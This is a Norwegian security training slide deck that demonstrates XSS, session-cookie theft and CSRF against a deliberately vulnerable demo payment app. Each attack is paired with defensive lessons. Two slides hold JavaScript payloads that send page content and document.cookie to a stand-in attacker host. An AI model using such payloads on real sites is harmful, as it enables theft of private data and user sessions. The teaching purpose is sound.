class: middle, center


# Å hacke en webapp



### Eirik Lied

---
class: middle, center

# Hvorfor?

---
class: middle

# Disclaimer
- _Ikke_ sikkerhetsekspert
- Praktisk orientert
- Skal gjennomgå _noen få_ sikkerhetshull
- Ikke _store_ sikkerhetshull...
- ...men finnes i mange Java webapplikasjoner

---
class: middle

## Vi skal _ikke_ se på

- Mass assignment
- Kryptering, TLS (HTTPS)
- Nettverk / Soner / Brannmurer
- SQL injection
- Remote code execution
- Innlogging / passord / 2-faktor

---
class: middle

# Vi skal se på

### XSS - for å lese private data

### Usikker sesjonscookie - for å stjele en sesjons med XSS

### CSRF - for å lure noen til å overføre penger

---
class: middle
# Dagens sårbare app

## Woops.app

- Vennebetaling er in!
- Istedet for Vipps, på web!
- Logg inn med telefonnummer
- Overfør penger til andre telefonnummer
- Du får se egne overføringer men ikke andres

---
class: middle

# Dagens sårbare app

## [Woops.app](http://woops.app:8080)

- Enkel Spring Boot app
- Spring JPA, Postgres, Spring MVC og jsp'er
- Ligger på GitHub: https://github.com/eiriklied/woops

---

class: middle

# Angrep 1

## XSS
---

class: middle

# XSS

Problem: Browseren kjører all kode den får fra en website.

Også det brukere eventuelt har skrevet inn!

---
class: middle

# Angreps-app

## [Hacker.app](http://hacker.app:3000/xss?content=Hei+Hei)

- Dum website
- Kjører på helt annet domene
- Kan brukes til å ta imot privat informasjon

---
class: middle

# Demo

Hent/se alt innhold på siden for en annen bruker:

```js
window.onload = function() {
  new Image().src='http://hacker.app:3000/xss?content='+escape(document.body.innerText);
}
```
---
class: middle

# Lærdom

Privat innhold ble lekket!

## Hvordan forhindre XSS?

Output må _alltid_ escapes!

2. Hvis du kan la være, ikke bruk jsp for å produsere html!!
  - Thymeleaf
  - Mustache
1. Hvis du _må_ bruke jsp, bruk `<c:out>`

---
class: middle

# Angrep 2

## Stjele sesjons-cookie

---
class: middle

- Sesjoner på web = cookies
- De må ikke kunne stjeles!

---
class: middle

# Angreps-app

- [Hacker.app](http://hacker.app:3000/xss?content=Cookie)

---
class: middle

# Demo

- Vis sesjonshåndtering i Woops
- Se på sesjons-cookie
- Ikke `HttpOnly`

Stjel sesjon-cookien fra annen bruker med js:

```js
new Image().src='http://hacker.app:3000/xss?content='+escape(document.cookie);
```
---
class: middle

## Lærdom:

Brukers sesjon ble stjålet!

- _Alltid_ sett sesjons-cookie til `HttpOnly`
- _Alltid_ sett til `secure` hvis site på HTTPS

---
class: middle
# Angrep 3

## CSRF

---
class: middle

## CSRF

- Man kan lure brukere til å utføre handlinger på en site uten å vite/samtykke
- Vi skal lure bruker til å gjøre overføring i woops

---
class: middle

# Angreps-app

- En hyggelig site, men som skjult poster skjema-data mot Woops
- Lur inn brukere med f.eks mail
---
class: middle

# Demo

Åpne network-tab og se hva som skjer på denne siden

http://catlovers.app:3000/csrf

---
class: middle
# Lærdom

Ufrivillig overføring på Woops!

- Implementer alltid CSRF-beskyttelse for `POST/PUT/PATCH/DELETE`!
- Må _alltid_ være skrudd på!

---
class: middle
# Hvordan?

- Legg et csrf-token på sesjon/cookie
- Lag et filter som sjekker at alle POST/PUT/PATCH/DELETE requests inneholder
  token
- Token må legges på som hidden felt i alle forms:  
  ```html
  <input type="hidden" name="csrf_token" value="${csrfToken}"/>
  ```

---
class: middle

# Til slutt

---
class: middle

# Til slutt

- Vi er bare mennesker, vi glemmer ting som er frivillig
- Default må være sikre innstillinger
- Micro libraries = ikke sikkert som default
- Bruk fulle webrammeverk som gir deg dette ut av boksen.
  - Play framework (Java)
  - Django (Python)
  - Rails (Ruby)

---
class: middle center

# Spørsmål?
